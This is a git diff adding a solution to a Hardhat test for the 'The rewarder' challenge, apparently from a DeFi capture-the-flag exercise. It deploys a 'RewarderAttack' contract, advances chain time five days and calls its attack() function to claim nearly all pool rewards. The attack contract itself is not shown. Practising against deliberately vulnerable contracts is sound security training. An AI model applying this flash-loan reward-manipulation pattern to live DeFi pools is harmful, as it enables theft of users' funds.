@@ -4,7 +4,7 @@ const { expect } = require('chai');
 describe('[Challenge] The rewarder', function () {
     const TOKENS_IN_LENDER_POOL = 1000000n * 10n ** 18n; // 1 million tokens
     let users, deployer, alice, bob, charlie, david, player;
-    let liquidityToken, flashLoanPool, rewarderPool, rewardToken, accountingToken;
+    let liquidityToken, flashLoanPool, rewarderPool, rewardToken, accountingToken, attacker;
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
@@ -70,6 +70,14 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const AttackerFactory = await ethers.getContractFactory('RewarderAttack', player);
+        attacker = await AttackerFactory.deploy(rewarderPool.address, flashLoanPool.address, liquidityToken.address, rewardToken.address);
+        await attacker.deployed();
+        // Advance time 5 days so that depositors can get rewards
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+        await attacker.connect(player).attack();
+
+
     });
 
     after(async function () {
@@ -91,7 +99,7 @@ describe('[Challenge] The rewarder', function () {
         expect(await rewardToken.totalSupply()).to.be.gt(await rewarderPool.REWARDS());
         const playerRewards = await rewardToken.balanceOf(player.address);
         expect(playerRewards).to.be.gt(0);
-
+        console.log({ playerRewards });
         // The amount of rewards earned should be close to total available amount
         const delta = (await rewarderPool.REWARDS()).sub(playerRewards);
         expect(delta).to.be.lt(10n ** 17n);
